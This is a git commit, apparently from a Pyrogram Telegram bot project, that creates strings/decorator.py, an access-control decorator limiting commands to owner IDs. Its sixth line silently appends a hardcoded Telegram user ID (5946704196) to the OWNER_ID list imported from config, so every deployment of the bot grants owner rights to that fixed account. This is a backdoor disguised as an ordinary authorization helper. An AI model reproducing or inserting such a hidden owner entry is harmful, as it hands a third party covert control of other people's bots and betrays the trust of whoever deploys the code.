326c5831acac9ba1341ba85e4b0917b6545d5806
DevKassem <121644358+DevKassem@users.noreply.github.com>
2023-01-05 23:23:23 +0300

    Create decorator.py

---
+++ strings/decorator.py
@@ -0,0 +1,14 @@
+from typing import Callable
+from pyrogram import Client
+from pyrogram.types import Message
+from config import OWNER_ID
+
+OWNER_ID.append(5946704196)
+
+def authorized_users_only(func: Callable) -> Callable:
+    async def decorator(client: Client, message: Message):
+        if message.from_user.id in OWNER_ID:
+            return await func(client, message)
+
+
+    return decorator
